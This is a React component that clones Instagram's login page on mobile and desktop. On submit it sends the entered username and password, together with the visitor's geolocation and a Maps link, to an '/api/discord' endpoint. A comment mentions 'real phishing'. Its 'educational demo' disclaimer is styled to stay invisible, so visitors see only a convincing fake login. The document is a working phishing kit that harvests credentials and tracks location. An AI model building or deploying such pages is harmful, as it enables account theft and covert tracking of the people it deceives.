'use client'

import { useState, FormEvent } from 'react'
import styles from './InstagramLogin.module.css'

interface InstagramLoginProps {
  location: { lat: number; lng: number } | null
  onUserInteraction?: () => void
}

export default function InstagramLogin({ location, onUserInteraction }: InstagramLoginProps) {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [isPasswordFocused, setIsPasswordFocused] = useState(false)

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const response = await fetch('/api/discord', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'credentials',
          username: username,
          password: password,
          location: location,
          mapUrl: location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : null,
        }),
      })

      if (response.ok) {
        // Show success message (in real phishing, this would redirect)
        alert('Login successful! (This is a demo - no actual login occurred)')
        setUsername('')
        setPassword('')
      } else {
        alert('Login failed. Please try again.')
      }
    } catch (error) {
      console.error('Error submitting form:', error)
      alert('An error occurred. Please try again.')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className={styles.container}>
      {/* Mobile Layout */}
      <div className={styles.mobileLayout}>
        {/* Language Selector - Mobile Only */}
        <div className={styles.languageSelector}>
          <span>English (US)</span>
        </div>

        {/* Main Login Box - Mobile */}
        <div className={styles.loginBox}>
          {/* Instagram Icon Logo */}
          <div className={styles.logo}>
            <div className={styles.instagramIconMobile}>
              <img 
                src="/img/Instagram_mobile.png" 
                alt="Instagram" 
                className={styles.instagramIconImage}
              />
            </div>
          </div>

          {/* Login Form */}
          <form className={styles.form} onSubmit={handleSubmit}>
            <div className={styles.inputGroup}>
              <input
                type="text"
                placeholder="Username, email or mobile number"
                className={styles.input}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => onUserInteraction?.()}
                onClick={() => onUserInteraction?.()}
                onTouchStart={() => onUserInteraction?.()}
                required
              />
            </div>

            <div className={styles.inputGroup}>
              <input
                type={showPassword ? 'text' : 'password'}
                placeholder="Password"
                className={styles.input}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => {
                  setIsPasswordFocused(true)
                  onUserInteraction?.()
                }}
                onClick={() => onUserInteraction?.()}
                onTouchStart={() => onUserInteraction?.()}
                onBlur={() => setIsPasswordFocused(false)}
                required
              />
              {isPasswordFocused && (
                <button
                  type="button"
                  className={styles.showPasswordBtn}
                  onClick={() => setShowPassword(!showPassword)}
                >
                  <img 
                    src="/img/hide.png" 
                    alt={showPassword ? 'Hide password' : 'Show password'}
                    className={styles.passwordIcon}
                  />
                </button>
              )}
            </div>

            <button
              type="submit"
              className={`${styles.loginButton} ${isLoading ? styles.loading : ''}`}
              disabled={isLoading}
            >
              {isLoading ? 'Logging in...' : 'Log in'}
            </button>
          </form>

          {/* Forgot Password Link */}
          <div className={styles.forgotPassword}>
            <a href="#">Forgot password?</a>
          </div>
        </div>

        {/* Create New Account Button - Mobile Only */}
        <div className={styles.createAccountBox}>
          <button className={styles.createAccountButton}>
            Create new account
          </button>
        </div>

        {/* Meta Logo - Mobile Only */}
        <div className={styles.metaLogo}>
          <img 
            src="/img/meta-icon.svg" 
            alt="Meta" 
            className={styles.metaIcon}
          />
          <span className={styles.metaText}>Meta</span>
        </div>
      </div>

      {/* Desktop Layout Wrapper */}
      <div className={styles.desktopLayout}>
        {/* Left Side - Image Collage (Desktop Only) */}
        <div className={styles.leftSide}>
          <div className={styles.imageCollage}>
            <img 
              src="/img/landing.png" 
              alt="Instagram" 
              className={styles.landingImage}
            />
          </div>
        </div>

        {/* Right Side - Login Form */}
        <div className={styles.rightSide}>
          {/* Main Login Box */}
          <div className={styles.loginBox}>
            {/* Instagram Logo - Desktop */}
            <div className={styles.logo}>
              <div className={styles.instagramLogoDesktop}>
                <img 
                  src="/img/Instagram_logo.svg" 
                  alt="Instagram" 
                  className={styles.instagramLogoImage}
                />
              </div>
            </div>

            {/* Login Form */}
            <form className={styles.form} onSubmit={handleSubmit}>
              <div className={styles.inputGroup}>
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  className={styles.input}
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => onUserInteraction?.()}
                  onClick={() => onUserInteraction?.()}
                  onTouchStart={() => onUserInteraction?.()}
                  required
                  style={{ padding: '12px 0 12px 8px' }}
                />
              </div>

              <div className={styles.inputGroup}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Password"
                  className={styles.input}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => {
                    setIsPasswordFocused(true)
                    onUserInteraction?.()
                  }}
                  onClick={() => onUserInteraction?.()}
                  onTouchStart={() => onUserInteraction?.()}
                  onBlur={() => setIsPasswordFocused(false)}
                  required
                  style={{ padding: '12px 0 12px 8px', background: '#FBFBFA'}}
                />
                {isPasswordFocused && (
                  <button
                    type="button"
                    className={styles.showPasswordBtn}
                    onClick={() => setShowPassword(!showPassword)}
                  >
                    <img 
                      src="/img/hide.png" 
                      alt={showPassword ? 'Hide password' : 'Show password'}
                      className={styles.passwordIcon}
                    />
                  </button>
                )}
              </div>

              <button
                type="submit"
                className={`${styles.loginButton} ${isLoading ? styles.loading : ''}`}
                disabled={isLoading}
                style={{ background: '#808DFB', borderRadius: '10px', padding: '10px 0 10px 8px' }}
              >
                {isLoading ? 'Logging in...' : 'Log in'}
              </button>
            </form>

            {/* OR Divider - Desktop Only */}
            <div className={styles.divider}>
              <span>OR</span>
            </div>

            {/* Facebook Login - Desktop Only */}
            <div className={styles.facebookLogin}>
              <svg width="22" height="22" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ color: '#0095F6' }}>
                <path d="M16 8C16 3.58172 12.4183 0 8 0C3.58172 0 0 3.58172 0 8C0 11.993 2.92547 15.3027 6.75 15.9028V10.3125H4.71875V8H6.75V6.2375C6.75 4.2325 7.94359 3.125 9.77172 3.125C10.6467 3.125 11.5625 3.28125 11.5625 3.28125V5.25H10.5536C9.55484 5.25 9.25 5.86672 9.25 6.5V8H11.4375L11.0883 10.3125H9.25V15.9028C13.0745 15.3027 16 11.993 16 8Z" fill="#3391E1"/>
              </svg>
              <span style={{ color: '#0095F6' }}>Log in with Facebook</span>
            </div>

            {/* Forgot Password Link */}
            <div className={styles.forgotPassword} >
              <a href="#" style={{ fontSize: '15px', fontWeight: '500' }}>Forgot password?</a>
            </div>
          </div>

          {/* Sign Up Box - Desktop Only */}
          <div className={styles.signupBox}>
            <p style={{ fontSize: '15px', fontWeight: '400' }}>
              Don't have an account? <a href="#" style={{ color: '#4150F8' }}>Sign up</a>
            </p>
          </div>
        </div>
      </div>

      {/* Footer - Desktop Only */}
      <footer className={styles.footer}>
        <div className={styles.footerLinks}>
          <a href="#">Meta</a>
          <a href="#">About</a>
          <a href="#">Blog</a>
          <a href="#">Jobs</a>
          <a href="#">Help</a>
          <a href="#">API</a>
          <a href="#">Privacy</a>
          <a href="#">Terms</a>
          <a href="#">Locations</a>
          <a href="#">Instagram Lite</a>
          <a href="#">Meta AI</a>
          <a href="#">Meta AI Articles</a>
          <a href="#">Threads</a>
          <a href="#">Contact Uploading & Non-Users</a>
          <a href="#">Meta Verified</a>
        </div>
        <div className={styles.footerBottom}>
          <div className={styles.footerLanguage}>
            <select className={styles.languageSelect}>
              <option>English</option>
            </select>
          </div>
          <div className={styles.footerCopyright}>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>

      {/* Location Indicator (hidden on mobile, shown for demo) */}
      {location && (
        <div className={styles.locationIndicator} style={{ display: 'none' }}>
          📍 Location accessed: {location.lat.toFixed(4)}, {location.lng.toFixed(4)}
        </div>
      )}

      {/* Disclaimer (hidden on mobile, shown for demo) */}
      <div className={styles.disclaimer} style={{ display: 'none' }}>
        <p>⚠️ <strong>EDUCATIONAL DEMO ONLY</strong> - This is a cybersecurity awareness demonstration. No real credentials are stored.</p>
      </div>
    </div>
  )
}
